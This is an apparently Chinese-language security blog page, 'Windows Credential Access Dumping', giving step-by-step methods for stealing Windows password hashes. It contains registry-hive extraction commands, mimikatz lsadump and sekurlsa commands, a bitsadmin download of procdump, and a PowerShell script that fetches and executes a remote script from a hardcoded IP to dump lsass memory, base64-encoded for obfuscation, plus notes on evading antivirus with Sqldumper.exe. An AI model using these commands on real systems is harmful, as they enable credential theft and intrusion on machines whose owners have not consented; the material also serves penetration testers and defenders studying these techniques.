@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>Windows Credential Access Dumping | j2ekim&#39;s Blog | 努力改变，从未放弃。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="域渗透">
+    <meta name="description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。">
+<meta name="keywords" content="域渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows Credential Access Dumping">
+<meta property="og:url" content="https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/index.html">
+<meta property="og:site_name" content="j2ekim&#39;s Blog">
+<meta property="og:description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_1.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_2.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_3.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_4.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_5.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_6.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_7.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_8.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_9.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_10.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_10.png">
+<meta property="og:updated_time" content="2019-07-23T09:02:39.924Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows Credential Access Dumping">
+<meta name="twitter:description" content="凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。">
+<meta name="twitter:image" content="https://j2ekim.github.io/img/Windows_Credential_Access_Dumping/img_1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="j2ekim&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/Avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">J2ekim</h5>
+          <a href="mailto:j2ekim@gmail.com" title="j2ekim@gmail.com" class="mail">j2ekim@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/j2ekim" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Windows Credential Access Dumping</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Windows Credential Access Dumping</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-06-23T08:28:44.000Z" itemprop="datePublished" class="page-time">
+  2019-06-23
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/">Web安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#SAM-Security-Accounts-Manager"><span class="post-toc-number">1.</span> <span class="post-toc-text">SAM(Security Accounts Manager)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#注册表"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">注册表</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Local-Security-Authority-LSA"><span class="post-toc-number">2.</span> <span class="post-toc-text">Local Security Authority (LSA)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-prodump-exe"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 prodump.exe</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x03-Powershell"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">0x03 Powershell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#0x04-Sqldumper-exe"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">0x04 Sqldumper.exe</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Windows_Credential_Access_Dumping"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Windows Credential Access Dumping</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-06-23 16:28:44" datetime="2019-06-23T08:28:44.000Z"  itemprop="datePublished">2019-06-23</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/">Web安全</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。<br><a id="more"></a></p>
+<h2 id="SAM-Security-Accounts-Manager"><a href="#SAM-Security-Accounts-Manager" class="headerlink" title="SAM(Security Accounts Manager)"></a>SAM(Security Accounts Manager)</h2><p>windows下的密码(HASH值)由SAM数据库储存，位置在C:\windows\system32\config\sam</p>
+<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Reg从注册表提取SAM：</span><br><span class="line"></span><br><span class="line">reg save HKLM\SYSTEM sys.hiv</span><br><span class="line"></span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line"></span><br><span class="line">reg save hklm\security security.hiv</span><br></pre></td></tr></table></figure>
+<p><img src="\img\Windows_Credential_Access_Dumping\img_1.png"><br>接着拉回本地机器 (很多环境下，不允许上传或者使用mimikatz。而针对非域控的单机离线提取hash显得尤为重要。) 接着用 mimikatz 加载这两个文件正常读取即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz.exe &quot;lsadump::sam /system:sys.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure></p>
+<p><img src="\img\Windows_Credential_Access_Dumping\img_2.png"></p>
+<p>同时也可以使用impacket套件中的secretsdump.py脚本进行解密。</p>
+<p>仓库地址：<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>Exe单文件版：<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">https://github.com/maaaaz/impacket-examples-windows</a> (32位)<br><img src="\img\Windows_Credential_Access_Dumping\img_3.png"></p>
+<h2 id="Local-Security-Authority-LSA"><a href="#Local-Security-Authority-LSA" class="headerlink" title="Local Security Authority (LSA)"></a>Local Security Authority (LSA)</h2><p>本地安全机构（LSA）是受 Microsoft Windows 保护的子系统，它是 Windows 客户端身份验证体系结构的一部分，该体系结构对本地计算机进行身份验证并创建登录会话。</p>
+<p>LSA 是一个认证机制</p>
+<h2 id="0x02-prodump-exe"><a href="#0x02-prodump-exe" class="headerlink" title="0x02 prodump.exe"></a>0x02 prodump.exe</h2><p>利用微软提供的prodump.exe 工具指定 lsass.exe 进程名进行抓取,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /rawreturn /transfer getfile https://raw.githubusercontent.com/klionsec/CommonTools/master/procdump.exe c:\windows\temp\dump.exe</span><br></pre></td></tr></table></figure></p>
+<p><img src="\img\Windows_Credential_Access_Dumping\img_4.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+<p><img src="\img\Windows_Credential_Access_Dumping\img_5.png"></p>
+<h3 id="0x03-Powershell"><a href="#0x03-Powershell" class="headerlink" title="0x03 Powershell"></a>0x03 Powershell</h3><p>同时也可以使用powershell 进行远程加载利用方式，利用base64进行简单的混淆加密<br>如下：<br><img src="\img\Windows_Credential_Access_Dumping\img_6.png"><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$address = <span class="string">"119.29.205.214"</span></span><br><span class="line">$downport = <span class="string">"80"</span></span><br><span class="line"></span><br><span class="line">$count1 = &#123;</span><br><span class="line">$n=<span class="keyword">new</span>-object net.webclient;</span><br><span class="line">$n.proxy=[Net.WebRequest]::GetSystemWebProxy();</span><br><span class="line">$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;&#125;</span><br><span class="line"></span><br><span class="line">$count2 = 'IEX' +" "+ '$n'+'.downloadstring'+"('http://$&#123;address&#125;:$downport/Out-Minidump.ps1')"</span><br><span class="line"></span><br><span class="line">$count3 = <span class="string">"Get-Process lsass | Out-Minidump -DumpFilePath c:\windows\temp"</span></span><br><span class="line"></span><br><span class="line">$count = (<span class="string">"$count1"</span> +<span class="string">"`n"</span>+ <span class="string">"$count2"</span>+<span class="string">"`n"</span>+$count3)</span><br><span class="line"></span><br><span class="line">echo $count</span><br><span class="line"></span><br><span class="line">Function base64([<span class="built_in">string</span>]$<span class="built_in">string</span>)&#123;</span><br><span class="line">$byteArray = [System.Text.UnicodeEncoding]::Unicode.GetBytes($<span class="built_in">string</span>)</span><br><span class="line">[Convert]::ToBase64String( $byteArray )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$base64 = base64 $count</span><br><span class="line"></span><br><span class="line">$end = (<span class="string">"powershell -ENC "</span> + $base64)</span><br></pre></td></tr></table></figure></p>
+<p><img src="\img\Windows_Credential_Access_Dumping\img_7.png"></p>
+<h3 id="0x04-Sqldumper-exe"><a href="#0x04-Sqldumper-exe" class="headerlink" title="0x04 Sqldumper.exe"></a>0x04 Sqldumper.exe</h3><p>除此之外，还可以使用mssql安装目录下自带的Sqldumper.exe，他要比prodump.exe 小很多很多，如果目标机器上直接就有 mssql ，直接使用即可，没有则直接上传上去就好了。</p>
+<p>(一般不会存在被AV杀掉的可能，除非安装的杀毒软件有dump内存文件保护。)<br><img src="\img\Windows_Credential_Access_Dumping\img_8.png"></p>
+<pre><code># tasklist | findstr &quot;lsass.exe&quot; 先找到 lsass.exe 进程 id
+</code></pre><p>使用用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SqlDumper &lt;process id (PID)&gt; &lt;thread id (TID)&gt; &lt;Flags:Minidump Flags&gt; &lt;SQLInfoPtr&gt; &lt;Dump Directory&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="\img\Windows_Credential_Access_Dumping\img_9.png"><br><img src="\img\Windows_Credential_Access_Dumping\img_10.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># mimikatz.exe &quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></p>
+<p>如下：<br><img src="\img\Windows_Credential_Access_Dumping\img_10.png">s</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-07-23T09:02:39.924Z" itemprop="dateUpdated">2019-07-23 17:02:39</time>
+</span><br>
+
+
+        
+        转载注明来自<a href="/2019/06/23/Windows_Credential_Access_Dumping/" target="_blank" rel="external">https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://j2ekim.github.io">
+            <img src="/img/Avatar.jpg" alt="J2ekim">
+            J2ekim
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/域渗透/">域渗透</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/&title=《Windows Credential Access Dumping》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/&title=《Windows Credential Access Dumping》 — j2ekim's Blog&source=凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Windows Credential Access Dumping》 — j2ekim's Blog&url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/03/27/InstallUtil&csc.exe-bypass application whitelisting/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">InstallUtil&amp;csc.exe-bypass application whitelisting</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>J2ekim &copy; 2017 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/&title=《Windows Credential Access Dumping》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/&title=《Windows Credential Access Dumping》 — j2ekim's Blog&source=凭据的获取，主要是说明了几种在主机中获取凭据 HASH 的方式，介绍了 SAM 和 LSA 凭据获取方式。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Windows Credential Access Dumping》 — j2ekim's Blog&url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2019/06/23/Windows_Credential_Access_Dumping/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACt0lEQVR42u3ay27CQAwF0P7/T1Opu6pNuH4MsDhZoSgkOUaaMba/vuLj8XPcf74/8/d8crf7O68deHh4eK1XvzqSa66uzF80v3N+PR4eHt5pXrJkJw/IAflT8i0EDw8P79N4CT4JRALrJd94eHh4n8mbbyS7BRE8PDy8d/F2CwF5cjxJ2ZdrLXh4eHgxb6sB9srPb+jv4eHh4cVtrckmkS/ZW/f/9Sw8PDy8A7y8zJqPQOWtr2Q9z7eEwj8GPDw8vAGvWpCdtMTygE6+9etN8PDw8I7x8mU3aWXloekNZuWpNh4eHt4JXp46V1tZk2JxNa1/8g54eHh4q7z7xT15TL7oz4cGyqHEw8PDO8CrNp/mW8X8yiQdx8PDwzvH64035ct0b7mfjFv9U2vBw8PDewnv/oV6pdhJgThPrKONAQ8PD2+VNxmKqoZgPqbwZFPBw8PDO8DLS7r5TasJd7VUUS2O4OHh4e3yqhtDr5xaLSvkRY0neDw8PLxjvLx5P1m+q0Gslm4v/zHg4eHhrfJ6i2/eptoK0MLIFx4eHt4qr/rS1RD0UvbqEy+/i4eHh3eAVy2V5iOnSYsr2TDmA2F4eHh4W7xeGp0n4o/bo9Cdaw0i4OHh4Z3gVUsAj+IxSYVzcPRj4OHh4a3y7pPXfOHutcGqCXf1nnh4eHi7vGqrKTmzlabngb48g4eHh/cSXnX5rpZZ88BNkvW13QkPDw8vfli1zV9dsqvfrQYIDw8P7xyvV5adDBNMChnljQoPDw/vAK+X+FbLFtXNI+9e5a07PDw8vF1e729/bztJQlZtyEWjA3h4eHgHePnY06SscK4kUa5V4OHh4b2EVy0lTIK4lujj4eHhfSSvN5I1CU1SXMbDw8M7zesVI6rDB7ul2yi4eHh4eAd4o8Gm+NXnjbHeZoOHh4e3yvsGIAhzqNZbYxwAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
